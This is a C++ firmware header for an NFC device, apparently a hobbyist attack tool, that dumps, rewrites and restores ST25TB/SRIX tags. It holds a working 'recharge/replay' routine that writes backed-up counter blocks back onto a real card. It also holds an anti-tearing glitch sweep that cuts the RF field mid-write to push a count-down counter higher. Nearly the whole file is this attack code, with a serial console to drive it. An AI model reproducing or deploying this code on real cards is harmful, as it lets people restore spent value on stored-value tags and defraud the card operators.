// ===========================================================================
// nfc_st25tb.h — ST25TB / SRI / SRIX (ISO 14443 Type B') reader + WRITER
// ---------------------------------------------------------------------------
// Proprietary memory tag on the Type-B carrier (not ISO-14443-3B / not ISO-DEP).
// Reuses the proven NFC-B analog bring-up (calypso::caly_isob_begin/end) and the
// ST25R3916 transceiver (nfc_transceive = TX with HW CRC_B in Type-B mode).
//
// Scope: read every block, dump to SD, write a block (with read-back verify),
// and restore a saved dump (the "recharge"/replay PoC: write the backed-up
// counter blocks back onto the real card). NOTE: ST25TB *card emulation* is NOT
// possible on the ST25R3916 (it only does NFC-A/F listen), so the recharge is
// done by WRITING the real card, never by emulating it.
//
// Commands (SRIX4K/ST25TB), CRC_B appended by HW in Type-B mode:
//   Initiate   06 00            -> Chip_ID (1 byte)
//   Select     0E <Chip_ID>     -> Chip_ID
//   Get_UID    0B               -> UID (8 bytes)
//   Read_block 08 <addr>        -> 4 bytes
//   Write_block 09 <addr> d0..d3 -> (no response; verify by read-back)
//   Completion 0F               -> (end transaction)
// Addressing: ST25TB512 = blocks 0..15 + system/OTP at 0xFF; SRIX4K = 0..127.
// Include AFTER nfc_calypso.h (for calypso::caly_isob_begin/end).
// ===========================================================================
#pragma once

namespace st25tb {

struct Dump {
  bool    ok;
  uint8_t chip;
  uint8_t uid[8];  bool have_uid;
  uint8_t blk[128][4];  int nblk;
  uint8_t sys[4];  bool have_sys;
};

static inline uint8_t* st25_xcv(const uint8_t* tx, int txl, int* rl, int to) {
  return nfc_transceive(tx, txl, rl, to);     // TX_CRC => CRC_B in Type-B mode
}
// Initiate + Select; returns 1 ok (chip filled), 0 no card, -1 select error.
static int st25_select(uint8_t* chip) {
  int rl = 0; uint8_t ini[2] = { 0x06, 0x00 };
  uint8_t* r = st25_xcv(ini, 2, &rl, 60);
  if (!r || rl < 1) return 0;
  uint8_t cid = r[0];
  uint8_t sel[2] = { 0x0E, cid };
  r = st25_xcv(sel, 2, &rl, 60);
  if (!r || rl < 1) return -1;
  *chip = r[0];
  return 1;
}
static bool st25_get_uid(uint8_t uid[8]) {
  int rl = 0; uint8_t g = 0x0B;
  uint8_t* r = st25_xcv(&g, 1, &rl, 60);
  if (r && rl >= 8) {
    for (int i = 0; i < 8; i++) uid[i] = r[7 - i];   // ST25R returns LSB-first; store MSB-first (D0 02 ..) like Flipper
    return true;
  }
  return false;
}
static bool st25_read_block(uint8_t addr, uint8_t out[4]) {
  int rl = 0; uint8_t c[2] = { 0x08, addr };
  uint8_t* r = st25_xcv(c, 2, &rl, 60);
  if (r && rl >= 4) { memcpy(out, r, 4); return true; }
  return false;
}
// Write one block. ST25TB write has NO response; we verify by read-back.
// Count-down counter blocks (5/6 on ST25TB) may refuse a value increase in HW
// -> the read-back then differs and this returns false (honest failure).
static bool st25_write_block(uint8_t addr, const uint8_t d[4]) {
  int rl = 0; uint8_t c[6] = { 0x09, addr, d[0], d[1], d[2], d[3] };
  st25_xcv(c, 6, &rl, 10);     // timeout / rl==0 is normal for a write
  delay(6);                    // EEPROM write time
  uint8_t chk[4];
  if (!st25_read_block(addr, chk)) return false;
  return memcmp(chk, d, 4) == 0;
}
static void st25_completion() { int rl = 0; uint8_t c = 0x0F; st25_xcv(&c, 1, &rl, 10); }

// Full read. Caller must have entered Type-B mode (caly_isob_begin).
static bool st25_dump(Dump& d) {
  memset(&d, 0, sizeof(d));
  uint8_t chip = 0; int s = st25_select(&chip);
  if (s <= 0) return false;
  d.chip = chip;
  d.have_uid = st25_get_uid(d.uid);
  for (int b = 0; b < 128; b++) {               // stops at end of memory
    if (!st25_read_block((uint8_t)b, d.blk[b])) break;
    d.nblk = b + 1;
  }
  d.have_sys = st25_read_block(0xFF, d.sys);
  st25_completion();
  d.ok = true;
  return true;
}

// --- SD (Flipper-ish .nfc, re-parseable by st25_load) ----------------------
static void st25_path(const Dump& d, char* path, int n) {
  int p = snprintf(path, n, "/evil/nfc/st25tb_");
  if (d.have_uid) for (int i = 0; i < 8; i++) p += snprintf(path + p, n - p, "%02X", d.uid[i]);
  else            p += snprintf(path + p, n - p, "chip%02X", d.chip);
  snprintf(path + p, n - p, ".nfc");
}
static bool st25_save(const Dump& d, char* out_path, int out_len) {
  SD.mkdir("/evil"); SD.mkdir("/evil/nfc");
  char path[80]; st25_path(d, path, sizeof path);
  File f = SD.open(path, FILE_WRITE);
  if (!f) return false;
  f.println("Filetype: Flipper NFC device");
  f.println("Version: 4");
  f.println("Device type: ST25TB");
  f.print("UID:"); if (d.have_uid) for (int i = 0; i < 8; i++) f.printf(" %02X", d.uid[i]); f.println();
  f.printf("Chip ID: %02X\n", d.chip);
  f.printf("Block Count: %d\n", d.nblk);
  for (int b = 0; b < d.nblk; b++) f.printf("Block %d: %02X %02X %02X %02X\n", b, d.blk[b][0], d.blk[b][1], d.blk[b][2], d.blk[b][3]);
  if (d.have_sys) f.printf("System OTP Block: %02X %02X %02X %02X\n", d.sys[0], d.sys[1], d.sys[2], d.sys[3]);
  f.close();
  if (out_path) { strncpy(out_path, path, out_len - 1); out_path[out_len - 1] = 0; }
  return true;
}
// Parse 4 hex bytes from a "x: AA BB CC DD" line tail into out[4].
static bool st25_parse4(const String& line, uint8_t out[4]) {
  int c = line.indexOf(':'); if (c < 0) return false;
  String t = line.substring(c + 1); t.trim(); t.replace("  ", " ");
  int got = 0, pos = 0;
  while (got < 4 && pos < (int)t.length()) {
    while (pos < (int)t.length() && t[pos] == ' ') pos++;
    if (pos + 1 >= (int)t.length() && pos + 2 > (int)t.length()) break;
    out[got++] = (uint8_t)strtol(t.substring(pos, pos + 2).c_str(), nullptr, 16); pos += 2;
  }
  return got == 4;
}
static bool st25_load(const char* path, Dump& d) {
  memset(&d, 0, sizeof(d));
  File f = SD.open(path, FILE_READ); if (!f) return false;
  while (f.available()) {
    String line = f.readStringUntil('\n'); line.trim();
    if (line.startsWith("UID:")) { uint8_t u[8] = {0}; String t = line.substring(4); t.trim();
      int got = 0, pos = 0; while (got < 8 && pos + 1 < (int)t.length()) { while (pos < (int)t.length() && t[pos] == ' ') pos++;
        u[got++] = (uint8_t)strtol(t.substring(pos, pos + 2).c_str(), nullptr, 16); pos += 2; }
      memcpy(d.uid, u, 8); d.have_uid = (got == 8); }
    else if (line.startsWith("Block ")) { int colon = line.indexOf(':'); if (colon < 0) continue;
      int bn = line.substring(6, colon).toInt(); if (bn < 0 || bn >= 128) continue;
      uint8_t v[4]; if (st25_parse4(line, v)) { memcpy(d.blk[bn], v, 4); if (bn + 1 > d.nblk) d.nblk = bn + 1; } }
    else if (line.startsWith("System OTP Block:")) { uint8_t v[4]; if (st25_parse4(line, v)) { memcpy(d.sys, v, 4); d.have_sys = true; } }
  }
  f.close();
  d.ok = (d.nblk > 0);
  return d.ok;
}

// --- Tear-off (anti-tearing counter glitch) --------------------------------
// Send Write_block(addr,val) then cut the RF carrier after `delay_us`, before
// the EEPROM commit finishes, leaving weak bits. Re-power, re-select, read back.
// Caller is already in Type-B mode (caly_isob_begin). `val` is usually the
// current block value (a clean, non-torn write is then a harmless no-op; only a
// torn write disturbs the cell). Returns true if read-back succeeded.
static bool st25_tear_once(uint8_t addr, const uint8_t val[4], uint32_t delay_us, uint8_t out[4]) {
  uint8_t chip;
  if (st25_select(&chip) <= 0) return false;
  uint8_t op_on = nfc_rr(NFC_OP_CTRL);        // field-on OP_CONTROL
  uint8_t cmd[6] = { 0x09, addr, val[0], val[1], val[2], val[3] };
  nfc_cmd(NFC_CMD_CLEAR_FIFO);
  nfc_fifo_w(cmd, 6);
  int txbits = 6 * 8;
  nfc_wr(NFC_TX_BYTES1, (txbits >> 8) & 0xFF);
  nfc_wr(NFC_TX_BYTES1 + 1, txbits & 0xFF);
  nfc_cmd(NFC_CMD_TX_CRC);                     // start TX -> card begins EEPROM write
  if (delay_us) delayMicroseconds(delay_us);
  nfc_wr(NFC_OP_CTRL, 0x00);                   // TEAR: carrier off now
  nfc_cmd(NFC_CMD_STOP_ALL);
  delay(2);                                    // card fully unpowered
  nfc_wr(NFC_OP_CTRL, op_on);                  // carrier back on
  nfc_cmd(NFC_CMD_FIELD_ON);
  delay(6);                                    // field settle + card power-up
  if (st25_select(&chip) <= 0) { out[0]=out[1]=out[2]=out[3]=0; return false; }
  bool ok = st25_read_block(addr, out);
  st25_completion();
  return ok;
}
static uint32_t st25_u32le(const uint8_t b[4]) { return (uint32_t)b[0] | (b[1]<<8) | (b[2]<<16) | ((uint32_t)b[3]<<24); }
static uint32_t st25_u32be(const uint8_t b[4]) { return (uint32_t)b[3] | (b[2]<<8) | (b[1]<<16) | ((uint32_t)b[0]<<24); }

// Restore saved blocks onto the present card (the recharge/replay PoC).
// Re-selects the live card, writes every block of `d` and read-back-verifies.
// `only_from`/`only_to` restrict to a block range (e.g. 5..6 = counters only).
// Fills results: nok/nfail counts. Caller is already in Type-B mode.
static bool st25_restore(const Dump& d, int only_from, int only_to, int* nok, int* nfail) {
  *nok = 0; *nfail = 0;
  uint8_t chip = 0; if (st25_select(&chip) <= 0) return false;
  for (int b = 0; b < d.nblk; b++) {
    if (b < only_from || b > only_to) continue;
    if (st25_write_block((uint8_t)b, d.blk[b])) (*nok)++; else (*nfail)++;
  }
  st25_completion();
  return true;
}

} // namespace st25tb

// ---------------------------------------------------------------------------
// Serial console: "st25 <sub>" — read / save / write / restore (recharge PoC).
// ---------------------------------------------------------------------------
void st25tb_console(const String& raw) {
  String a = raw; a.trim();
  int sp = a.indexOf(' ');
  String sub = (sp < 0 ? a : a.substring(0, sp)); sub.toLowerCase();
  String rest = (sp < 0 ? String() : a.substring(sp + 1)); rest.trim();
  if (sub == "" || sub == "help") {
    Serial.println("== st25 (ST25TB / SRI / SRIX, Type B') ==");
    Serial.println("  st25 read                 dump all blocks (no save)");
    Serial.println("  st25 save                 dump + save /evil/nfc/st25tb_<uid>.nfc");
    Serial.println("  st25 write <blk> <8hex>   write 1 block (backup+verify)");
    Serial.println("  st25 restore <path> [a b] rewrite saved blocks (recharge PoC; opt range a..b)");
    Serial.println("  st25 tear <blk> [f t s n] anti-tearing glitch sweep (count-down recharge)");
    Serial.println("  note: ST25TB emulation is NOT possible on ST25R3916 (NFC-A/F listen only)");
    return;
  }
  if (!nfc_opened) { if (!nfc_open()) { Serial.println("[st25] no Cap NFC HAT"); return; } }
  calypso::caly_isob_begin();

  if (sub == "read" || sub == "dump" || sub == "save") {
    st25tb::Dump d;
    if (!st25tb::st25_dump(d)) { Serial.println("  no ST25TB (no Initiate response)"); }
    else {
      Serial.printf("  Chip %02X  UID ", d.chip); if (d.have_uid) for (int i = 0; i < 8; i++) Serial.printf("%02X", d.uid[i]); Serial.println();
      for (int b = 0; b < d.nblk; b++) Serial.printf("  blk %3d: %02X %02X %02X %02X\n", b, d.blk[b][0], d.blk[b][1], d.blk[b][2], d.blk[b][3]);
      if (d.have_sys) Serial.printf("  sys FF : %02X %02X %02X %02X\n", d.sys[0], d.sys[1], d.sys[2], d.sys[3]);
      if (sub == "save") { char p[80]; if (st25tb::st25_save(d, p, sizeof p)) Serial.printf("  saved %s\n", p); else Serial.println("  save failed"); }
    }
  } else if (sub == "write") {
    int s2 = rest.indexOf(' ');
    if (s2 < 0) { Serial.println("  usage: st25 write <blk> <8hex>"); }
    else {
      int blk = rest.substring(0, s2).toInt(); String hh = rest.substring(s2 + 1); hh.replace(" ", "");
      uint8_t d[4]; for (int i = 0; i < 4; i++) d[i] = (uint8_t)strtol(hh.substring(i * 2, i * 2 + 2).c_str(), nullptr, 16);
      uint8_t chip; if (st25tb::st25_select(&chip) > 0) {
        uint8_t bak[4]; st25tb::st25_read_block((uint8_t)blk, bak);
        Serial.printf("  backup blk%d: %02X %02X %02X %02X\n", blk, bak[0], bak[1], bak[2], bak[3]);
        bool w = st25tb::st25_write_block((uint8_t)blk, d);
        Serial.printf("  write  blk%d: %02X %02X %02X %02X -> %s\n", blk, d[0], d[1], d[2], d[3], w ? "ok" : "FAIL (verify mismatch / read-only / count-down)");
        st25tb::st25_completion();
      } else Serial.println("  no card");
    }
  } else if (sub == "restore") {
    int s2 = rest.indexOf(' ');
    String path = (s2 < 0 ? rest : rest.substring(0, s2));
    int from = 0, to = 127;
    if (s2 >= 0) { String r2 = rest.substring(s2 + 1); r2.trim(); int s3 = r2.indexOf(' '); if (s3 > 0) { from = r2.substring(0, s3).toInt(); to = r2.substring(s3 + 1).toInt(); } }
    if (!path.startsWith("/")) path = "/evil/nfc/" + path;
    st25tb::Dump d;
    if (!st25tb::st25_load(path.c_str(), d)) { Serial.printf("  load failed: %s\n", path.c_str()); }
    else {
      int nok = 0, nf = 0; st25tb::st25_restore(d, from, to, &nok, &nf);
      Serial.printf("  restore blocks %d..%d from %s: %d ok, %d fail\n", from, to, path.c_str(), nok, nf);
    }
  } else if (sub == "tear") {
    // tear <blk> [from_us] [to_us] [step_us] [tries]  — anti-tearing glitch sweep
    long args[5] = { 5, 100, 3000, 100, 3 }; int na = 0, pos = 0;
    while (na < 5 && pos < (int)rest.length()) {
      while (pos < (int)rest.length() && rest[pos] == ' ') pos++;
      int sp2 = rest.indexOf(' ', pos); if (sp2 < 0) sp2 = rest.length();
      if (sp2 > pos) args[na++] = rest.substring(pos, sp2).toInt();
      pos = sp2 + 1;
    }
    uint8_t blk = (uint8_t)args[0]; uint32_t from = args[1], to = args[2], step = args[3] < 1 ? 50 : args[3]; int tries = args[4] < 1 ? 1 : args[4];
    uint8_t orig[4], chip;
    if (st25tb::st25_select(&chip) <= 0) { Serial.println("  no card"); }
    else {
      st25tb::st25_read_block(blk, orig); st25tb::st25_completion();
      uint32_t oLE = st25tb::st25_u32le(orig), oBE = st25tb::st25_u32be(orig);
      Serial.printf("  tear blk%u orig %02X%02X%02X%02X (LE=%lu BE=%lu)\n", blk, orig[0], orig[1], orig[2], orig[3], (unsigned long)oLE, (unsigned long)oBE);
      Serial.printf("  WARNING: this can DECREMENT/corrupt the counter (count-down). sweep %lu..%lu us step %lu x%d\n", (unsigned long)from, (unsigned long)to, (unsigned long)step, tries);
      bool hit = false;
      for (uint32_t du = from; du <= to && !hit; du += step) {
        for (int t = 0; t < tries && !hit; t++) {
          uint8_t out[4];
          if (!st25tb::st25_tear_once(blk, orig, du, out)) { Serial.printf("  %5lu us: (no card)\n", (unsigned long)du); continue; }
          uint32_t LE = st25tb::st25_u32le(out), BE = st25tb::st25_u32be(out);
          bool changed = memcmp(out, orig, 4) != 0;
          bool higher = (LE > oLE) || (BE > oBE);
          Serial.printf("  %5lu us: %02X%02X%02X%02X%s%s\n", (unsigned long)du, out[0], out[1], out[2], out[3], changed ? " CHANGED" : "", higher ? "  <= HIGHER!" : "");
          if (higher) { Serial.println("  >>> counter INCREASED (tear-off hit). stopping."); hit = true; }
          else if (changed) { memcpy(orig, out, 4); oLE = LE; oBE = BE; }   // track drift so next write stays a clean no-op
        }
      }
      if (!hit) Serial.println("  no increase in this window (try finer step / other range)");
    }
  } else Serial.println("  unknown (try: st25 help)");

  calypso::caly_isob_end();
}
